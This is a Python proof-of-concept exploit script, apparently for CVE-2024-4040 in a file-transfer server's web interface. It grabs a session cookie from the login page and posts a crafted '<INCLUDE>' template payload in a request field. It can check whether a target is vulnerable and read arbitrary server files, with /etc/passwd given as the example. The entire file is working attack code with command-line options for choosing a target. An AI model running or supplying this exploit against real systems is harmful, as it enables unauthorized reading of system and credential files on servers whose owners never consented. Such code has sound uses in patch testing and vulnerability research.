import requests
import sys
import re
import argparse
import textwrap

class bcolors:
    """
    Define colors for status output
    """
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'


def test_if_vulnerable(target):
    """
    Function to check if target is vulnerable by checking if the response includes 'commandResult'
    """
    r = requests.post(f'{target}/WebInterface/login.html')
    
    try:
        cookies = r.cookies
        auth_cookie = cookies['currentAuth']
        
        data = {
            "command": "exists",
            "paths": "<INCLUDE>{user_ip}</INCLUDE>",
            "c2f": cookies['currentAuth']
        }

        # Check vulnerability
        r = requests.post(target, data = data, cookies = cookies)

        if 'commandResult' in r.text:
            print(f'{bcolors.OKGREEN}[+]{bcolors.ENDC} Target Vulnerable!\n')
            return True

    except Exception as e:
        print(f'{bcolors.FAIL}[!]{bcolors.ENDC} Error, target most likely not vulnerable: {e}')
        return False


def include_file(target, file):
    """
    Function exploit target and include file specified by argument 'file'
    """    
    r = requests.post(f'{target}/WebInterface/login.html')
    cookies = r.cookies
    data = {
        "command": "exists",
        "paths": f"<INCLUDE>{file}</INCLUDE>",
        "c2f": cookies['currentAuth']
    }
    r = requests.post(target, data = data, cookies = cookies)
    print(r.text)

if __name__ == '__main__':

    # Define a parser for arguments
    parser = argparse.ArgumentParser(
        description='Python PoC for CVE-2024-4040 By Incendium',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        add_help=False,
        epilog=textwrap.dedent("""Examples:

Only test if target is vulnerable     exploit.py -t http://10.10.1.1:8080
Inlcude file                          exploit.py -t http://10.10.1.1:8080 -f /etc/passwd
            """ ))

    # Define arguments for the parser
    parser.add_argument('-h', '--help', action='store_true', help='Show this help message and exit')
    parser.add_argument('-t', '--target', help='Specify target URL')
    parser.add_argument('-f', '--file', help='Specify File to include')
    args = parser.parse_args()

    # Intro
    intro = """
CVE-2024-4040 PoC by Incendium. Please use responsibly.
-------------------------------------------------------------------------
    """
    print(intro)
    help = """
Options:
    -h  --help               Show this screen.
    -t  --target             Specify target URL
    -f  --file               Specify file to include

Example:

Only test if vulnerable:     exploit.py -t http://10.10.1.23:8080
Include /etc/passwd:         exploit.py -t http://10.10.1.23:8080 -f /etc/passwd
"""

if args.help:
    print(help)
    exit()

# If there is less than 1 arguments, we will print out the help menu.
if len(sys.argv[1:]) < 1:
    print("exploit.py [-h] [-t --target] [-f --file]")
    print(help)
    sys.exit(0)

if args.target and not args.file:
    # Only check if vulnerable
    test_if_vulnerable(args.target)

if args.file:
    # First check if vulnerable
    if test_if_vulnerable(args.target):
        # If True, then include the file
        include_file(args.target, args.file)
    exit()